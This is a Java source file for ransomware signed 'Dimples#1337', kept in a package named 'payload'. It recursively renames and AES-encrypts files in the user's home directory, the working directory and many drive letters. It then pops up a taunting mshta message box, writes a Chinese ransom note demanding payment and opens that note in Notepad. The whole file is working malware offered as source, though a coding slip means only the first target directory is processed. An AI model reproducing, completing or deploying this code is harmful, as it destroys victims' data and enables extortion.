package com.dimples1337.payload;

import com.dimples1337.utils.AESUtils;

import javax.swing.*;
import javax.swing.filechooser.FileSystemView;
import java.io.*;
import java.util.Objects;

public class Dimples {
    public static String EXTENDED_NAME = "HackedByDimples#1337";
    public static String RANSOM_NOTE = "Hacked by Dimples#1337.\n" +
            "主播你的电脑已经被我黑了，你的文件已经被我加密了\n" +
            "火速给我打钱解锁文件，否则你的文件就彻底完几把犊子了\n" +
            "\n" +
            "-Dimples#1337";
    public static String[] TARGET_DIR = {
            String.valueOf(FileSystemView.getFileSystemView() .getHomeDirectory()),
            System.getProperty("user.dir"),
            "D:\\","E:\\","F:\\","G:\\","H:\\","I:\\","G:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\",
            "U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\","A:\\","B:\\"
    };
    public static String KEY;
    
    static {
        try {
            KEY = AESUtils.getSecretKey();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static void main(String[] args){
        int i = 0;
        if(i != TARGET_DIR.length){
            encrypt(new File(TARGET_DIR[i]));
            i++;
        }
        try {
            Runtime.getRuntime().exec("mshta vbscript:msgbox(\"You got hacked by Dimples#1337\",16,\"Dimples#1337\")(window.close)");
        } catch (IOException e) {
            e.printStackTrace();
        }
        WriteStringToFile(FileSystemView.getFileSystemView() .getHomeDirectory() + "\\Dimples's Note.txt");
        try {
            Runtime.getRuntime().exec("notepad " + FileSystemView.getFileSystemView() .getHomeDirectory() + "\\Dimples's Note.txt");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    public static void WriteStringToFile(String filePath) {
        try {
            File file = new File(filePath);
            PrintStream ps = new PrintStream(new FileOutputStream(file));
            ps.println(RANSOM_NOTE);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }
    
    public static void encrypt(File dir) {
        encrypting(dir, 0);
    }
    
    private static void encrypting(File f, int level) {
        if (f.isDirectory()) {
            for (File temp : f.listFiles()) {
                encrypting(temp, level + 1);
            }
        } else {
            String[] strArray = f.getName().split("\\.");
            int suffixIndex = strArray.length - 1;
            if (Objects.equals(strArray[suffixIndex], EXTENDED_NAME))
                return;
            if(f.getName().contains("Dimples's Note"))
                return;
            f.renameTo(new File(f.getPath() + "." + EXTENDED_NAME));
            try {
                AESUtils.encryptFile(KEY, f.getPath() + "." + EXTENDED_NAME, f.getPath() + "." + EXTENDED_NAME);
            } catch (Exception e) {
                e.printStackTrace();
            }

        }
    }
}
